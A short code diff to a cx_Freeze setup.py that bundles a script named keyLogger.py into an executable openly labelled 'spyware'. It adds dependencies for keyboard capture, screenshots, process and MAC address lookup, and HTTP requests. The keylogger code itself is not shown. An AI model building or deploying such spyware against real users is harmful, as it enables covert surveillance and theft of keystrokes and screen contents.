@@ -1,20 +1,13 @@
 from cx_Freeze import setup, Executable
 
+build_exe_options = {"packages": ["os"], "includes": ["keyboard", "psutil", "requests", "pyscreenshot", "getmac", "PIL"]}
+
 base = None
 
-executables = [Executable("keyLogger.py", base=base)]
-
-packages = ["idna"]
-options = {
-    'build_exe': {
-        'packages': packages,
-    },
-}
-
 setup(
-    name="spyware",
-    options=options,
-    version="2.5",
-    description='Script for monitoring suspicious activity',
-    executables=executables
+    name="Meu spyware",
+    version="0.1",
+    description="Um spyware",
+    options={"build_exe": build_exe_options},
+    executables=[Executable("keyLogger.py", base=base)]
 )
